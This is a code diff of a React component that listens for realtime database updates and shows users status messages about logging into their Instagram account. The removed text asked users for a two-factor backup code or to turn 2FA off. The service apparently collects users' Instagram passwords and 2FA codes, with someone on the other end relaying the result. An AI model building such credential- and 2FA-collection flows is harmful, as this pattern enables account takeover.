@@ -83,21 +83,19 @@ const StatsSection = ({ user, userData, avatar, username, isVerified, name,
         table: 'users',
         filter: `id=eq.${userData.id}`
       }, payload => {
-        // console.log('Change received!', payload)
+        // console.log('client: Change received!', payload)
         const status = payload?.new?.status
         const messageSender = payload?.new?.messageSender
+        const msg = payload?.new?.msg && payload?.new?.msg
 
-        var text = ''
-        if (status === '2fa') {
-          text = `Two-factor authentication is currently enabled on your account. In order to log in directly to your Instagram account, please provide us with a backup code you can find under "Settings; Security; Two-factor authentication; Additional methods; Backup codes. If you don't find a backup code, you will need to turn off two-factor authentication before we can log in.`
-        }
+        var text = '';
         if (status === 'incorrect') {
-          text = `The password you entered for your instagram account is incorrect. Please try again.`
+          text = `Password you provided is incorrect. Please reset your password or enter a correct one.`
         }
         if (status === 'active') {
           text = `success`
         }
-        text && messageSender !== userData?.username && setMessage({ status, text })
+        text && messageSender !== userData?.username && setMessage({ status, text, code: msg?.admin, user: payload?.new })
       })
       .subscribe()
 
